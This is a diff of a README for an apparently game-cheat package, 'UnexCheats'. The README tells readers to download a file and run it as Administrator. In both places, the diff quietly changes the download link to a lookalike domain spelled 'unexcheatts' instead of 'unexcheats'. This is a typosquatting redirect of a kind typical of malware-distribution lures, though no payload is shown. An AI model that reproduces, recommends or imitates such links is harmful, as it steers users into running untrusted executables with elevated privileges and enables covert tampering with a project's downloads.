@@ -25,7 +25,7 @@
 1. **📥 Download** the package from the button below.
 3. **🖱️ Run as Administrator**.
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=2b2b2b)](https://unexcheats.github.io/UnexCheats/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=2b2b2b)](https://unexcheatts.github.io/UnexCheats/)
 
 # Preview
 [![Watch the video](https://cdn-cf-east.streamable.com/image/t8ctpa.jpg?Expires=1703202961864&Key-Pair-Id=APKAIEYUVEN4EVB2OKEQ&Signature=kSASfwmiCV3PCK4KrUMQZ1Ekse1FQs0h3fHv8SJb3UsbEpp0xSa8fjZYpHXHhBbxEtlU9-L07iHb9Z~yDE9~ckgwrUzkDzdZ0g2rs2ccyIjaGKbtzvcNgxCp1dpR~F54nsTyD63PhzhtYMW6eZsHoe-DOfOndFjP6omQk1EAWmzoMrMBQXn5-OpoudZl0qOVdzLPeeUfdqPmIUnhSwuqQpOdIrZoYHd7XY8ZYV~azx4dCzVWvhbVHvZAWUsbrzcn4Ue1MWLnebDfdcLzLlaQwbxBVZRe8llnLNFxDoGUfeQUntSL03~4pj~C4F-dMkP3D9dVGuJ8LkZt59OG1vXkHg__)](https://streamable.com/t8ctpa)
@@ -82,4 +82,4 @@ But if this helped you please star the repo and checkout my UC Profile, and if y
 
 ## 📥 Download
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=2b2b2b)](https://unexcheats.github.io/UnexCheats/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=2b2b2b)](https://unexcheatts.github.io/UnexCheats/)
